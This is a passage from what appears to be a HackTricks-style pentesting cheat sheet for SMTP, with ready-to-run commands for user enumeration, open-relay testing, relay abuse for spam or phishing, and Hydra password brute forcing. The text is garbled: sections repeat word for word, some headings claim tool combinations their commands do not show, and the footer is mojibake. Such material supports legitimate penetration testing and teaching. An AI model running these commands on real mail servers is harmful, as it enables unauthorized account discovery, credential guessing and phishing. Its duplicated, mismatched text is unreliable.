#### SMTP User Enumeration with Burp Suite

Burp Suite can be used to perform SMTP user enumeration by intercepting and modifying the `VRFY` requests.

1. Configure Burp Suite to intercept SMTP traffic.
2. Send a `VRFY` request to the SMTP server.
3. Intercept the request in Burp Suite.
4. Modify the request to test different usernames.
5. Forward the modified request to the server and observe the response.

#### SMTP User Enumeration with Nmap and NSE Scripts

Nmap can be used with NSE scripts to enumerate SMTP users. The `smtp-enum-users` script can be used for this purpose.

```
$ nmap -p 25 --script smtp-enum-users <SMTP_SERVER>
```

#### SMTP User Enumeration with Metasploit and NSE Scripts

Metasploit can also be used with NSE scripts to enumerate SMTP users. The `smtp-enum-users` script can be used for this purpose.

```
msf5 > use auxiliary/scanner/smtp/smtp_enum
msf5 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS <SMTP_SERVER>
msf5 auxiliary(scanner/smtp/smtp_enum) > run
```

#### SMTP User Enumeration with SMTP-User-Enum

SMTP-User-Enum is a tool specifically designed for SMTP user enumeration. It can be used to quickly identify valid usernames on an SMTP server.

```
$ smtp-user-enum -M VRFY -U /path/to/usernames.txt -t <SMTP_SERVER>
```

#### SMTP User Enumeration with SMTP-User-Enum and Metasploit

SMTP-User-Enum can also be used with Metasploit to perform SMTP user enumeration.

```
msf5 > use auxiliary/scanner/smtp/smtp_enum
msf5 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS <SMTP_SERVER>
msf5 auxiliary(scanner/smtp/smtp_enum) > run
```

#### SMTP User Enumeration with SMTP-User-Enum and Nmap

SMTP-User-Enum can also be used with Nmap to enumerate SMTP users.

```
$ nmap -p 25 --script smtp-enum-users <SMTP_SERVER>
```

#### SMTP User Enumeration with SMTP-User-Enum, Metasploit, and Nmap

SMTP-User-Enum can be used in combination with Metasploit and Nmap to perform SMTP user enumeration.

```
msf5 > use auxiliary/scanner/smtp/smtp_enum
msf5 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS <SMTP_SERVER>
msf5 auxiliary(scanner/smtp/smtp_enum) > run
```

### SMTP Relay

#### Open Relay Testing

To test if an SMTP server is an open relay, you can use the `smtp-open-relay` NSE script in Nmap.

```
$ nmap -p 25 --script smtp-open-relay <SMTP_SERVER>
```

#### SMTP Relay Exploitation

If you find an SMTP server that allows open relay, you can use it to send emails to any recipient without authentication. This can be exploited for spamming or phishing purposes.

To exploit an open relay SMTP server, you can use tools like `swaks` or `telnet`.

```
$ swaks --to <RECIPIENT_EMAIL> --from <SENDER_EMAIL> --server <SMTP_SERVER>
```

```
$ telnet <SMTP_SERVER> 25
HELO <SENDER_DOMAIN>
MAIL FROM: <SENDER_EMAIL>
RCPT TO: <RECIPIENT_EMAIL>
DATA
Subject: <EMAIL_SUBJECT>

<EMAIL_BODY>
.
QUIT
```

### SMTP User Enumeration with SMTP-User-Enum, Metasploit, and Nmap

SMTP-User-Enum can be used in combination with Metasploit and Nmap to perform SMTP user enumeration.

```
msf5 > use auxiliary/scanner/smtp/smtp_enum
msf5 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS <SMTP_SERVER>
msf5 auxiliary(scanner/smtp/smtp_enum) > run
```

### SMTP Relay

#### Open Relay Testing

To test if an SMTP server is an open relay, you can use the `smtp-open-relay` NSE script in Nmap.

```
$ nmap -p 25 --script smtp-open-relay <SMTP_SERVER>
```

#### SMTP Relay Exploitation

If you find an SMTP server that allows open relay, you can use it to send emails to any recipient without authentication. This can be exploited for spamming or phishing purposes.

To exploit an open relay SMTP server, you can use tools like `swaks` or `telnet`.

```
$ swaks --to <RECIPIENT_EMAIL> --from <SENDER_EMAIL> --server <SMTP_SERVER>
```

```
$ telnet <SMTP_SERVER> 25
HELO <SENDER_DOMAIN>
MAIL FROM: <SENDER_EMAIL>
RCPT TO: <RECIPIENT_EMAIL>
DATA
Subject: <EMAIL_SUBJECT>

<EMAIL_BODY>
.
QUIT
```
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conferenceæ˜¯ä¸€åœºå›½é™…ç½‘ç»œå®‰å…¨æ´»åŠ¨**](https://www.dragonjarcon.org/)ï¼Œå°†äº2023å¹´9æœˆ7æ—¥è‡³8æ—¥åœ¨å“¥ä¼¦æ¯”äºšæ³¢å“¥å¤§ä¸¾è¡Œã€‚è¿™æ˜¯ä¸€åœºå†…å®¹ä¸°å¯Œçš„æŠ€æœ¯æ´»åŠ¨ï¼Œå±•ç¤ºäº†æœ€æ–°çš„è¥¿ç­ç‰™è¯­ç ”ç©¶æˆæœï¼Œå¸å¼•äº†æ¥è‡ªä¸–ç•Œå„åœ°çš„é»‘å®¢å’Œç ”ç©¶äººå‘˜ã€‚\
ç«‹å³åœ¨ä»¥ä¸‹é“¾æ¥æ³¨å†Œï¼Œä¸è¦é”™è¿‡è¿™ä¸ªé‡è¦çš„ä¼šè®®ï¼:

{% embed url="https://www.dragonjarcon.org/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
